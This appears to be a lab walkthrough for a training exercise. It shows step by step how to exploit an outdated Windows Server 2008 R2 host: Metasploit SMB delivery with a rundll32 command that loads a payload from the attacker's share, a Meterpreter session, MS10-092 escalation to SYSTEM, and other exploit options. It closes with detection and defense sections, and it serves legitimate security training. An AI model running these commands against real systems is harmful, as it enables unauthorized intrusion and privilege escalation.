# 🛰️ Youloit Lab Environment Setup

## 📂 Lab Overview
[!INFO] This lab involves exploiting a Windows Server 2008 R2 system to gain administrative privileges and retrieve the `flag.txt` file.

### Access Details:
- **Username**: htb-student
- **Password**: HTB_@cademy_stdnt!
- **Target IP Address**: <target_ip>

## 🚀 Initial Access

### Step 1: Connect via RDP
[!SUCCESS] Connect to the target machine using Remote Desktop Protocol (RDP).

```cmd
rdesktop -u htb-student -p 'HTB_@cademy_stdnt!' <target_ip>
```

If you encounter issues with `xfreerdp`, try:
```cmd
rdesktop -u htb-student -p HTB_@cademy_stdnt! <target_ip>
```

## 📊 Patch Level Enumeration

### Step 2: Check System Patches
[!INFO] Determine the current patch level of the system to identify vulnerabilities.

```cmd
wmic qfe
```

**Expected Output**:
Caption                                     HotFixID   InstallDate  
http://support.microsoft.com/?kbid=2533552  KB2533552  3/31/2021

This indicates a severely outdated system with very few patches.

## 🚀 Vulnerability Assessment

### Step 3: Assess Vulnerabilities
[!SUCCESS] Use PowerShell to run Sherlock for comprehensive vulnerability assessment.

```powershell
Set-ExecutionPolicy bypass -Scope process
cd C:\Tools\
Import-Module .\Sherlock.ps1
Find-AllVulns
```

**Key Findings**:
- **MS10-092**: Task Scheduler XML (Appears Vulnerable)
- **MS15-051**: ClientCopyImage Win32k (Appears Vulnerable)
- **MS16-032**: Secondary Logon Handle (Appears Vulnerable)

## 🛠️ Metasploit Setup

### Step 4: SMB Delivery Module
[!SUCCESS] Start the Metasploit console and configure the `smb_delivery` module.

```bash
sudo msfconsole -q
use exploit/windows/smb/smb_delivery
set LHOST <your_vpn_ip>
set SRVHOST <your_vpn_ip>
exploit
```

**Result**: The module provides a rundll32 command to execute the payload on the target machine.

## 💻 Initial Shell Acquisition

### Step 5: Establish Meterpreter Session
[!SUCCESS] Execute the provided rundll32 command in the Command Prompt of the target system.

```cmd
rundll32.exe \\<your_vpn_ip>\<share>\test.dll,0
```

**Result**: A Meterpreter session is established as the current user.

## 🔑 Process Migration for 64-bit

### Step 6: Migrate to a 64-bit Process
[!SUCCESS] Identify and migrate to a 64-bit process using the meterpreter shell.

```cmd
meterpreter > getpid
Current pid: 2268
```

List running processes:

```cmd
meterpreter > ps
```

Migrate to a 64-bit process (e.g., PID 2796):

```cmd
meterpreter > migrate 2796
[*] Migration completed successfully.
```

Background the session:

```cmd
meterpreter > background
```

## 🔒 Privilege Escalation via MS10-092

### Step 7: Exploit Task Scheduler
[!SUCCESS] Use the `ms10_092_schelevator` exploit to gain system-level privileges.

```bash
use exploit/windows/local/ms10_092_schelevator
set SESSION 1
set LHOST <your_vpn_ip>
set LPORT 4443
exploit
```

**Result**: A new session is established as `NT AUTHORITY\SYSTEM`.

## 🎉 Flag Retrieval

### Step 8: Get the Administrator Flag
[!SUCCESS] Drop to a shell and retrieve the flag.

```cmd
shell
type C:\Users\Administrator\Desktop\flag.txt
```

**Expected Result**: The content of the `flag.txt` file is displayed.

---

## 🔄 Alternative Privilege Escalation Methods

### Manual Exploit Compilation
[!WARNING] For environments where Metasploit is restricted, compile and execute exploits manually from source code.

Example: MS15-051 exploit compilation:

```cmd
# Download: https://www.exploit-db.com/exploits/37367/
# Compile with Visual Studio or mingw
.\ms15-051.exe "cmd.exe"
```

### PowerShell-Based Exploits
[!SUCCESS] Use PowerUp for comprehensive enumeration and exploitation.

```powershell
Import-Module .\PowerUp.ps1
Invoke-AllChecks

Get-UnquotedService
Get-ModifiableServiceFile
Get-ModifiableService
```

## 🛠️ Legacy System Considerations

### Business Context Assessment
[!INFO] Evaluate the business context before recommending removal of legacy systems.

**Examples**:
- **Mission-critical software dependencies**
- **Cost of system replacement/upgrade**
- **Regulatory compliance requirements**
- **Vendor support availability**

### Risk Mitigation Strategies
[!SUCCESS] Implement strategies to mitigate risks associated with legacy systems.

- Network segmentation/isolation
- Endpoint detection and response (EDR)
- Custom extended support contracts
- Application allowlisting
- Enhanced access controls

## ⚠️ Detection & Defense

### Detection Indicators
[!WARNING] Monitor for indicators of exploitation:

- Sherlock script execution
- Metasploit SMB delivery usage
- Rundll32 execution with UNC paths
- Task Scheduler exploit signatures
- Process migration activities

### Defensive Measures
[!SUCCESS] Deploy defensive measures to protect legacy systems.

- Apply all available security patches
- Implement network segmentation
- EDR deployment and monitoring
- Restrict administrative access
- Regular security assessments
- Plan for system modernization

## 💡 Key Takeaways

1. **Windows Server 2008** lacks modern security features and is highly vulnerable.
2. **Patch enumeration** reveals missing critical security updates.
3. **Sherlock** provides comprehensive vulnerability assessment for legacy systems.
4. **MS10-092** Task Scheduler exploit is reliable for privilege escalation on Server 2008.
5. **Process migration** to 64-bit is required for some exploits.
6. **Business context** must be considered when dealing with legacy systems.
7. **Multiple escalation vectors** are available on unpatched systems.

---

*Windows Server 2008 systems represent high-value targets due to missing security features and unpatched vulnerabilities, but business considerations must guide remediation recommendations.*